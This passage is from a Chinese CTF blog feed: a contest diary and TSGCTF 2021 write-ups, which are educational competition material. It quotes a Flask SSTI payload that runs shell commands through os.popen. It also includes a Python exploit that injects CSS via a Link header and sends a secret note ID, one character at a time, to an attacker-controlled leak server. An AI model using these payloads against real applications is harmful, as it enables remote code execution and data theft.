&lt;p>很水的wp，或者说是复现，没有什么参考价值；挺有意思的题，学到了ssti的新trick；Source Analysis的剩下两个题全是web+reverse/crypto/pwn（指路wp: &lt;a href="https://lo0l.com/2021/10/11/digitaloverdose.html#source-analysis---boris">Boris&lt;/a> | &lt;a href="https://github.com/maulvialf/CTF-Writeups/tree/main/2021/004-digitaloverdose/source-analysis/c1-i_think_this_should_be_c4">I think this could be C4&lt;/a>），谢谢，完全看不懂，已经跪了&lt;/p>
&lt;p>web狗死路一条死路一条死路一条死路一条死路一条&lt;/p>
&lt;p>😅&lt;/p></description></item><item><title>2021强网杯青少赛线下赛参赛记录</title><link>https://amiaaaz.github.io/2021/10/18/2021-qwbqss-a-short-diary/</link><pubDate>Mon, 18 Oct 2021 20:38:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/18/2021-qwbqss-a-short-diary/</guid><description>&lt;h2 id="比赛前一天15号">比赛前一天/15号&lt;/h2>
&lt;p>下午2点50的飞机，结果临出学校前发现身份证丢了，贼尴尬，找了两圈没找到就直接去机场了，用临时身份证明上了飞机之后收到电话说身份证被捡到了orz 这么低级的错误下次绝不会有了TAT&lt;/p>
&lt;p>到郑州之后打滴滴结果司机电话打不通，又正好下雨，跟队友一起上了个打表飞快的小黑车，到地铁站门口就148块钱，还好最后只给了100，但是也太他妈的坑了&lt;/p>
&lt;p>之后挤人贼多的地铁，先去酒店附近的派出所开了个证明，然后到酒店住下，饭还行，是1层自助餐，我跟另一个小姐姐住一个房间&lt;/p>
&lt;h2 id="比赛第一天16号">比赛第一天/16号&lt;/h2>
&lt;p>早上起来之后跟同队的两个师傅去科技馆签到，领衣服和参赛证（那边的志愿者是郑州中学的小姐姐们，颜值超高&lt;/p>
&lt;p>然后彩排了一下选手发言，回去吃中饭（默默吐槽一下某几位师傅去参观科技馆没带我玩这件事了！！！记仇 = =。&lt;/p>
&lt;p>3点半开幕式，我默默做了个选手代表发言（表情管理大失败 所有照片都拍得贼丑）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/486A35615FE4F32ED871A0AFBD697DC6.jpg" alt="img">&lt;/p>
&lt;p>4点开赛，真不愧是跑男模式，把我一整年的运动量都给跑完了，成功克服了不敢坐手扶电梯的恐惧症，科技馆4层上下来回跑&lt;/p>
&lt;p>最开始给的题是要在科技馆中找到5张图片上的地方并且拍照，这是最耗体力的，跑着跑着就迷路了（后来想的话，这个环节又不给分，一开始就莽有点草率，可以直接做别的题）&lt;/p>
&lt;p>然后后面的题分散在1234层，有的题是只能做一次但是不限时，有的是限时又只能一次，根据解出的程度给卡片，把上面的成语作为flag交到平台上&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/F4E04C905C58822FD7EEB22861986EC7.jpg" alt="img">&lt;/p>
&lt;p>说说几个印象深刻的题吧，火焰熊熊，红色革命阅读理解题，给几张纸阅读展板上的内容然后答题，不太好找，拿了1600分，10分钟不太够用，有几个是蒙上去的&lt;/p>
&lt;p>阿尼玛格斯，刚开始我过去之后一看题目描述，好家伙，拟态，还是只能做一次，我就先走了，后面再过来做的时候发现这他妈也是个阅读理解题，草，还是本童话书，全程罚抄写&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/C578A65EB1ED41D68D217A0CE037BAA2.jpg" alt="img">&lt;/p>
&lt;p>阿拉霍洞开，匪夷所思的题，以为是打开存包柜，没想到就是戳开左下角的开始，然后点开文件夹&lt;/p>
&lt;p>还有个题是找摄像头，忘了叫啥名字了，说是有180个摄像头，前5分钟肉眼看，后5分钟能拿红外线的扫描枪，反正是尽可能往多了圈（x&lt;/p>
&lt;p>驱逐麻瓜是两个题，一个是密码，不会解，php的放到最后没时间看&lt;/p>
&lt;p>很无语的是一些项目因为场地限制还需要排队，我们排到阿拉霍洞开这个题的时候离结束就剩10分钟了，还好解的比较快&lt;/p>
&lt;p>中间我们队最高到第2名，最后截止的时候是第10，8000分，刚好挂到大屏幕上&lt;/p>
&lt;p>比完之后好多队都换了头像和签名，于是我们换了这个&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/C%7EOI%5DO%24%24WGX%24KDDTJ0EZ0I2.jpg" alt="img">&lt;/p>
&lt;p>吃完饭就8点了，回去准备第二天的break&amp;amp;fix&lt;/p>
&lt;h2 id="比赛第二天17号">比赛第二天/17号&lt;/h2>
&lt;p>早上7点半就开始比，6点半起床，困得一批又没胃口，吃了俩蛋糕拿了个酸奶就去会场了&lt;/p>
&lt;p>匆忙连上网线，看了比赛手册，awdp模式，放了4道题，两个pwn两个web&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/CC3D4B6386081D1C8AACB8D8CC53FF25.jpg" alt="img">&lt;/p>
&lt;p>首先感谢一下pwn👴旺旺师傅 两个题全出了 十分nb&lt;/p>
&lt;p>web方面，一个是php反序列化（怎么老是你） 全场0解（用到了原生类的一个特性 可以参考这个题&lt;a href="https://johnfrod.top/ctf/nepctf-2021%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD/">[NepCTF 2021]梦里花来牡丹亭&lt;/a>），一个是flask的ssti注入，一开始也是0解，但是不断的放hint都没人get到他的意思，直到最后把payload都给放出来了才开始有解，可能是想的签到难度，但是大家没签上😅&lt;/p>
&lt;p>（payload是&lt;code>{{lipsum['__globals__']['__builtins__']['eval']('__import__(&amp;quot;os&amp;quot;).popen(&amp;quot;ls /&amp;quot;).read()')}}&lt;/code> ）&lt;/p>
&lt;p>然后是fix阶段，我修了php，另一位师傅修了flask，pwn👴修了一道pwn（另一个没有过check&lt;/p>
&lt;p>防御阶段的分加的特别快，修了两个题直接就干到第一了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211018212632528.png" alt="image-20211018212632528">&lt;/p>
&lt;p>（忽略时间 这是晚上回来之后截的图&lt;/p>
&lt;p>应该有很多队不会用docker的相关操作吃亏了，第一轮fix只有很少的队过了check，到第二轮fix的时候还给了docker复制文件的命令&lt;/p>
&lt;p>这一场和昨天的那场综合下来我们是8623分，第二名，拿一等奖~芜湖&lt;/p>
&lt;p>第一名是北大的一个大佬，solo全场，ttttttql&lt;/p>
&lt;h2 id="小结">小结&lt;/h2>
&lt;p>被队里两个师傅带着第一次打线下，感觉还是挺棒的~~，免费吃住 爽的一批~~，感觉线下有一群人打ctf是个挺赛博朋克的事情哈哈哈哈哈哈哈哈哈&lt;/p>
&lt;p>打之前其实慌的一批，毕竟自己web比较菜，害怕拉跨，害怕给大家拖后腿，不过还好最后一切顺利，拿到了一等，之前从不敢设想的&lt;/p>
&lt;p>酸菜棒棒鱼yyds!!!!!!!!&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022121656282.png" alt="image-20211022121656282">&lt;/p>
&lt;p>从开始学ctf，学安全方面的知识到现在也不过半年多一点，学的还是相当粗糙的，见到的师傅们都学的时间比我长，水平都比我高很多很多&lt;/p>
&lt;p>未来的路还很长，不管怎么样，我都会坚持走下去的。&lt;/p></description></item><item><title>TSGCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/</link><pubDate>Mon, 04 Oct 2021 16:44:41 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/</guid><description>&lt;p>&lt;a href="https://score.ctf.tsg.ne.jp/challenges">https://score.ctf.tsg.ne.jp/challenges&lt;/a> | &lt;a href="https://ctftime.org/event/1431/tasks/">https://ctftime.org/event/1431/tasks/&lt;/a>&lt;/p>
&lt;h2 id="webwelcome-to-tsg-ctf">Web/Welcome to TSG CTF!&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>We want to welcome you,&lt;/strong> &lt;em>seriously.&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004010601885.png" alt="image-20211004010601885">&lt;/p>
&lt;p>抓包后发现我们输入的值是post的json中的key部分而不是value，很奇怪&lt;/p>
&lt;p>给了源码，看下app.js&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004083305948.png" alt="image-20211004083305948">&lt;/p>
&lt;p>11行有个比较，要通过它，可以把body置空访问（用burp的话要改一下Content-Type，默认的application/json是不能置空的），&lt;code>typeof null === 'object'&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl &lt;span style="color:#d88200">&amp;#34;http://34.84.69.72:34705/&amp;#34;&lt;/span> -X POST
&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;statusCode&amp;#34;&lt;/span>:500,&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>:&lt;span style="color:#d88200">&amp;#34;Internal Server Error&amp;#34;&lt;/span>,&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span>:&lt;span style="color:#d88200">&amp;#34;Cannot read property &amp;#39;TSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}&amp;#39; of null&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>flag会在报错中出现！&lt;/p>
&lt;p>&lt;code>TSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}&lt;/code>&lt;/p>
&lt;h2 id="webudon">Web/Udon&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>Ta-dah! Here comes udon!&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>Udon Note，一眼xss之类的&lt;/p>
&lt;p>我们发出去的note中的尖括号会被转义为实体字符，Reset会清空cookie，连带着消失之前发布过的Note&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004080116886.png" alt="image-20211004080116886">&lt;/p>
&lt;p>有Tell Admin About This Udon Note的选项&lt;/p>
&lt;p>————没什么想法 以下是平淡的复现过程&lt;/p>
&lt;p>看源码，main.go&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004155626744.png" alt="image-20211004155626744">&lt;/p>
&lt;p>我们需要找到那个特殊的notes_id&lt;/p>
&lt;p>接着往下看&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004155826973.png" alt="image-20211004155826973">&lt;/p>
&lt;p>http的相应头可以泄露一些信息，这里是入手点&lt;/p>
&lt;p>仅在Firefox中有一个&lt;code>Link&lt;/code>请求头，几乎等同于HTML中的&lt;code>&amp;lt;link&amp;gt;&lt;/code>标签&lt;/p>
&lt;pre tabindex="0">&lt;code>Link: &amp;lt;/foo.css&amp;gt;; rel=&amp;quot;stylesheet&amp;quot;; type=&amp;quot;text/css&amp;quot;
&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;/foo.css&amp;quot;&amp;gt;
&lt;/code>&lt;/pre>&lt;p>我们可以向app中的任意一页注入任意的css&lt;/p>
&lt;p>同时也有需要Bypass的地方，比如这里的CSP策略&lt;code>style-src 'self'&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004160452260.png" alt="image-20211004160452260">&lt;/p>
&lt;p>我们可以先创建一个带有恶意css的note，再将这个note的链接放入&lt;code>Link&lt;/code>请求头中&lt;/p>
&lt;pre tabindex="0">&lt;code>http://ip:port/?k=Link&amp;amp;v=%3C%2F(&amp;lt;URL of a note with styles to inject&amp;gt;)%3E%3B%20rel%3D%22stylesheet%22%3B%20type%3D%22text%2Fcss%22
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># exp.py&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://localhost:8080&amp;#34;&lt;/span>
&lt;span style="color:#111">LEAK_LENGTH&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>
&lt;span style="color:#111">CHAR_CANDIDATES&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_letters&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span>
&lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://host.docker.internal:1337&amp;#34;&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">build_payload&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prefix&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">candidates&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;List[str]&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;EXPLOIT_BASE_ADDR is not set&amp;#34;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">candidate&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">candidates&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">id_prefix_to_try&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">candidate&lt;/span>
&lt;span style="color:#111">matcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">lambda&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:],&lt;/span> &lt;span style="color:#d88200">&amp;#39;/notes/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">id_prefix_to_try&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#34;a[href^=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">matcher&lt;/span> &lt;span style="color:#f92672">+&lt;/span> \
&lt;span style="color:#d88200">&amp;#34;] { background-image: url(&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span> &lt;span style="color:#f92672">+&lt;/span> \
&lt;span style="color:#d88200">&amp;#34;/leak?q=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">id_prefix_to_try&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;); }&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">post_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">description&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/notes&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;title&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;description&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">description&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;content-type&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;invalid status code: &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;Location&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/notes/&amp;#39;&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">report_note_as_stylesheet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">id&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">header_value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;/notes/&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;gt;; rel=&amp;#34;stylesheet&amp;#34;; type=&amp;#34;text/css&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/tell&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;path&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;/?k=Link&amp;amp;v=&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">header_value&lt;/span>&lt;span style="color:#111">)),&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;invalid status code: &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/start&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">build_payload&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">CHAR_CANDIDATES&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exploit_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">post_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exploit&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">report_note_as_stylesheet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info]: started exploit with a new note: &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">/notes/&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/leak&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">leak&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">leaked_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;q&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">LEAK_LENGTH&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] leaked (full ID): &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">))&lt;/span>
